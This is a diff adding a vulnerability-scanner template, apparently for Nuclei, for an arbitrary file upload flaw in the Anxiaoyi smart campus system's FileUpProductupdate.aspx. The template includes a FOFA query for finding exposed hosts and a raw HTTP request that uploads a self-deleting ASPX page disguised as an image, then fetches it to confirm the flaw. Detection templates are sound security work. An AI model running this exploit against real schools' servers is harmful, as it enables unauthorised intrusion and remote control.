@@ -1,0 +1,45 @@
+
+id: anxiaoyi-FileUpProductupdate-fileupload
+
+info:
+  name: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: “安校易”是银达云创公司基于多年教育市场信息化建设经验沉淀，经过充分的客户需求调研，并依据国家“十三五”教育信息化建设规范而推出的综合互联网+教育信息化解决方案。“安校易”以物联网技术为基础，以学生在校“学食住行”管理为中心，将消费管理、门禁管理、各类学生出入管理、家校互通、校门口进出身份识别等系统进行集成，有效减少校园管理盲点，提升校园安全防范与管理水平。同时，“安校易”又以大数据、人脸识别技和移动互联网为核心技术，以“安全·安心·沟通”为核心诉求，在教育局、学校、家长之间构建一个和谐高效和智慧的沟通互动平台，促进教育合力和智慧教育生态体系成型，做到让学校管理安全、让老师管理快捷、让领导科学决策和让家长安心放心。该系统FileUpProductupdate.aspx接口处存在任意文件上传漏洞，容易导致系统被远控。
+  metadata:
+    max-request: 1
+    fofa-query: title="智慧综合管理平台登入"
+    verified: true
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(29))}}"
+requests:
+  - raw:
+      - |+
+        POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----{{rboundary}}
+        Connection: close
+        
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
+        Content-Type: image/jpeg
+        
+        <%@Page Language="C#"%><%Response.Write("{{file_content}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------{{rboundary}}--
+
+      - |
+        GET /Upload/Publish/000000/0_0_0_0/update.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
